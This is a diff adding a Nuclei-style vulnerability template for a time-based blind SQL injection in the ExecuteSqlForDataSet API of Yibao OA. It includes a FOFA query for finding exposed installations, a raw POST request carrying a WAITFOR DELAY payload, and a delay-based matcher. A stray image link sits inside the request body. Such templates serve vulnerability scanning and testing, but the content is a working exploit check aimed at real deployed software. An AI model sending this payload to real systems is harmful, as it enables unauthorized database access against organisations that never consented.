@@ -1,0 +1,35 @@
+id: poc-bi8bt4dyws4vuo6z
+info:
+  name: 易宝OA-ExecuteSqlForDataSet接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bi8bt4dyws4vuo6z
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bi8bt4dyws4vuo6z
+    fofa: product="顶讯科技-易宝OA系统"
+http:
+- raw:
+  - 'POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 52
+
+
+    token=zxh&sql=;WAITFOR DELAY ''0:0:5''--&strParameters
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351517138-807880af-c777-4c46-be3c-2da008af95f4.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
